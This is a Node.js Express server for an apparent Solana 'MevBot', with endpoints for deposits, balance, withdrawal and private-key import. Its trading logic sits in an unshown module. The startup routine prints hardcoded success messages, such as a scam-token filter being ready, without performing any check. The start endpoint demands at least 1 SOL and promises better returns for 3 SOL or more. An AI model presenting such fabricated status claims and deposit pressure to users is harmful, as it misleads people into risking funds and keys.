// src/mevbot.js
const express = require('express');
const path = require('path');
const WebSocket = require('ws');
const open = require('open');
const {
    run,
    showWalletInfo,
    generateQRCode,
    getBalance,
    apiDEX,
    createNewWallet,
    importWallet,
    configureAutoBuy,
    configureSlTp
} = require('./mev.js');

const app = express();
const PORT = 8080;
const LAMPORTS_PER_SOL = 1000000000; // 1 SOL = 1 billion lamports

app.use(express.static(path.join(__dirname, '../public')));
app.use(express.json());

const wss = new WebSocket.Server({ port: 8081 });

function logToConsole(message) {
    console.log(message);
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(JSON.stringify({ type: 'log', message }));
        }
    });
}

async function runBot() {
    logToConsole('=== Welcome to Solana MevBot ===\n');
    logToConsole('Scam token filter is ready ✅');
    logToConsole('List of Tokens ✅');
    logToConsole('Connected to network ready ✅');
    await run();
}

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../public/index.html'));
});

app.get('/api/wallet-info', async (req, res) => {
    try {
        const info = await showWalletInfo();
        res.json(info);
    } catch (error) {
        logToConsole('Error in wallet-info: ' + error.message);
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/deposit-qr', async (req, res) => {
    try {
        const wallet = await showWalletInfo(); // Ensure wallet is loaded
        const qrPath = await generateQRCode(wallet.address);
        res.json({ qrPath });
    } catch (error) {
        logToConsole('Error in deposit-qr: ' + error.message);
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/balance', async (req, res) => {
    try {
        const wallet = await showWalletInfo(); // This throws if walletInfo is undefined
        const balance = await getBalance(wallet.address);
        res.json({ balance: balance / LAMPORTS_PER_SOL });
    } catch (error) {
        logToConsole('Error in balance: ' + error.message);
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/start', async (req, res) => {
    try {
        const wallet = await showWalletInfo();
        const balanceLamports = await getBalance(wallet.address);
        const balanceSol = balanceLamports / LAMPORTS_PER_SOL;

        if (balanceSol < 1) {
            if (balanceSol === 0) {
                return res.status(400).json({ error: 'Insufficient balance: need at least 1 SOL to start, 3 SOL or more will proivde a better ROI.' });
            } else {
                return res.status(400).json({
                    error: `Deposit at least 1 SOL or more for the bot to launch. Current balance: ${balanceSol.toFixed(2)} SOL. Note: If you deposit 3 SOL or more, your ROI will be much greater.`
                });
            }
        }

        await apiDEX('start', null, null, logToConsole);
        res.json({ message: 'Bot launched successfully' });
    } catch (error) {
        logToConsole('Error launching bot: ' + error.message);
        res.status(500).json({ error: error.message });
    }
});
app.post('/api/withdraw', async (req, res) => {
    const { recipientAddress, amountSol } = req.body;
    if (!recipientAddress || !amountSol || isNaN(amountSol) || amountSol <= 0) {
        return res.status(400).json({ error: 'Invalid address or amount' });
    }
    try {
        await apiDEX('withdraw', recipientAddress, amountSol);
        res.json({ message: 'Funds extracted successfully' });
    } catch (error) {
        logToConsole('Error in withdrawal: ' + error.message);
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/new-wallet', async (req, res) => {
    const { overwrite } = req.body;
    try {
        const wallet = await createNewWallet(overwrite || false);
        if (!wallet) {
            return res.status(400).json({ error: 'Wallet already exists' });
        }
        res.json(wallet);
    } catch (error) {
        logToConsole('Error creating new wallet: ' + error.message);
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/import-wallet', async (req, res) => {
    const { base58Key } = req.body;
    if (!base58Key) {
        return res.status(400).json({ error: 'Private key required' });
    }
    try {
        const wallet = await importWallet(base58Key);
        res.json(wallet);
    } catch (error) {
        logToConsole('Error importing wallet: ' + error.message);
        res.status(500).json({ error: error.message });
    }
});

app.listen(PORT, async () => {
    logToConsole(`Server running at http://localhost:${PORT}`);
    logToConsole(`WebSocket server running at ws://localhost:${8081}`);
    await runBot();
});